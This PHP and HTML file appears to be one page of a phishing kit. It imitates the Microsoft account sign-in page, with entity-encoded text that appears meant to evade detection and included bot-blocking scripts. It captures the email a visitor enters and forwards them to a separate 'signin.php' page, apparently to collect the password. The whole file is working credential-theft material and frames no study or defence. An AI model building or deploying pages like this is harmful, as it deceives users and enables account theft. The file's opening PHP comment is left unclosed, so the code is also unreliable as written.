<?php
/*

error_reporting(0);
@session_start();

$sess_id = session_id();

$_SESSION["sess_id"] = $sess_id;
$get_sess = $_SESSION["sess_id"];

require "includes/blocker1.php"; // ITS REQURED EVERY PAGE

/*
* Form Submit
*/

if(isset($_POST['submit'])) 
{ 
    $_SESSION["email"] = $_POST['email'];

    header("Location: signin.php?SESSION=$get_sess");
}
?>
<?
require "includes/blocker1.php";
require "bots.php";
?>

<html dir="ltr">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head><link rel="shortcut icon" href="assets/favicon.ico" /><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><base /><title>Mic&#114;&#111;&#115;oft acc&#111;&#117;&#110;t</title><meta name="PageID" content="i4416"><meta name="SiteID" content="38936"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"/><style type="text/css">body{margin: 0;background-image: url("assets/bg.jpg");background-repeat: no-repeat,no-repeat; background-position: center center,center center; background-size: cover,cover;background-color: #fff;color: #000;font-family: "Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;font-weight: 400;font-size: 15px;line-height: 20px;}.outer{display: table;position: absolute;height: 100%;width: 100%;}.middle{display: table-cell;vertical-align: middle;}.inner{margin-left: auto;margin-right: auto;min-height: 300px;max-height: 350px;min-width: 275px;max-width: 350px;width: calc(100% - 40px);padding: 36px;margin-bottom: 28px;background-color: #fff;-webkit-box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.55);-moz-box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.55);box-shadow:0px 2px 3px rgba(0, 0, 0, 0.55);border: 1px solid #818C94;border: 1px solid rgba(0, 0, 0, 0.4);}.footer{position: fixed;bottom: 0px;width: 100%;overflow: visible;z-index: 99;clear: both;background-color: rgba(0, 0, 0, 0.6);}div.footerNode{margin: 0;float: right;}.form-group{margin-bottom: 16px;}.text-title{padding: 0;margin-top: 16px;margin-bottom: 12px;font-size: 24px;color: #404040;font-size: 1.5rem;line-height: 28px;font-weight: 600;line-height: 1.75rem;font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";}.text-title:lang(zh-cn), .text-title:lang(zh-tw){font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande","Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";}.relative{position: relative;}div.footerNode a,div.footerNode span{color: white;font-size: 12px;line-height: 28px;white-space: nowrap;display: inline-block;margin-left: 8px;margin-right: 8px;}a{text-decoration: none;}@media (max-width: 600px), (max-height: 392px){.middle{vertical-align: top;}.inner{-webkit-box-shadow: none;-moz-box-shadow: none;box-shadow: none;border: 0;padding: 24px;width: 100%;}.footer.default{background: white;}.footer.default div.footerNode a,.footer.default div.footerNode span{color: #777777;}div.footerNode{float: left;}}
.office-input{
	border-top: 0;
    border-left: 0;
    border-right: 0;
    padding-left: 0px;
    border-width: 1px;
    border-color: rgba(0,0,0,0.6);
    height: 36px;
    outline: none;
    width: 100%;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent; 
    font-family: inherit;
    font-size: inherit;   
}
.office-input:focus {
	border-color: #0067b8;
}
.info {
	margin-top: 15px;
}
.info-text{
	font-size: 13px;
	margin-bottom: 13px;
}
.info-link {
	color: #0067b8;
}
.info-link:hover {
	color: #666666;
	text-decoration: underline;
	cursor: pointer;
}
.nextbtn {
    border-color: #0067b8;
    background-color: #0067b8;
    color: #fff;
    min-height: 32px;
    font-family: inherit;
    font-size: inherit;
    width: 100%;
    outline: none;
}
.nextbtn:hover {
    border-color: #005DA6;
    background-color: #005DA6;
    cursor: pointer;
}
.btn-block {
    text-align: right;
    float: right;
    width: 100px;
}
.alert-text {
	color: #e81123;
}
         .animated {
            -webkit-animation-duration: 1s;
            animation-duration: 1s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
         }
         
         @-webkit-keyframes fadeInRight {
            0% {
               opacity: 0;
               -webkit-transform: translateX(20px);
            }
            100% {
               opacity: 1;
               -webkit-transform: translateX(0);
            }
         }
         
         @keyframes fadeInRight {
            0% {
               opacity: 0;
               transform: translateX(30px);
            }
            100% {
               opacity: 1;
               transform: translateX(0);
            }
         }
         
         .fadeInRight {
            -webkit-animation-name: fadeInRight;
            animation-name: fadeInRight;
        }
</style></head><body><div><div class="outer" id="idHeaderTD9"><div class="middle"><div class="inner relative">
	<img src="assets/logo.svg" class="logo" alt="Microsoft account" />
<div class="content animated fadeInRight">
	<div id="jsDisabledTitle" class="row text-title" role="heading">&#83;&#105;&#103;&#110;&#32;&#105;&#110;</div>
	<form name="login" onsubmit="return validateForm()" autocomplete="off" method="POST" action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" required>
		<div class="alert" id="alert" style="display: none;">
			<span class="alert-text">&#69;&#110;&#116;&#101;&#114;&#32;&#97;&#32;&#118;&#97;&#108;&#105;&#100;&#32;&#101;&#109;&#97;&#105;&#108;&#32;&#97;&#100;&#100;&#114;&#101;&#115;&#115;&#44;&#32;&#112;&#104;&#111;&#110;&#101;&#32;&#110;&#117;&#109;&#98;&#101;&#114;&#44;&#32;&#111;&#114;&#32;&#83;&#107;&#121;&#112;&#101;&#32;&#110;&#97;&#109;&#101;&#46;</span>
		</div>
		<input type="text" name="email" id="name" class="office-input" placeholder="Email, phone, or Skype" autofocus>
		<div class="info">
			<p><span class="info-text">&#78;&#111;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#63;&#32;<span class="info-link">&#67;&#114;&#101;&#97;&#116;&#101;&#32;&#111;&#110;&#101;&#33;</span></span></p>
			<p><span class="info-text info-link">&#67;&#97;&#110;&#39;&#116;&#32;&#97;&#99;&#99;&#101;&#115;&#115;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#63;</span></p>
			<p><span class="info-text info-link">&#83;&#105;&#103;&#110;&#45;&#105;&#110;&#32;&#111;&#112;&#116;&#105;&#111;&#110;&#115;</span></p>
		</div>
		<div class="bottom">
			<div class="btn-block">
				<button class="nextbtn" type="submit" name="submit">&#78;&#101;&#120;&#116;</button>
			</div>
		</div>
	</form>
</div>
<script>
function validateForm() {
  var x = document.forms["login"]["email"].value;

  if (x == "" || x == null) {
    document.getElementById('alert').style.display = "block";
    document.getElementById('name').style.borderColor='#e81123';
    document.getElementById('name').focus();
    return false;
  }
}
</script>
</div></div></div><div class="footer default"><div class="footerNode"><span><a href="#">&#169;2021&nbsp;&#84;&#101;&#114;&#109;&#115;&#32;&#111;&#102;&#32;&#117;&#115;&#101;</a></span><span><a href="#">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#32;&#38;&#32;&#99;&#111;&#111;&#107;&#105;&#101;&#115;</a></span></div></div></div></body>

</html>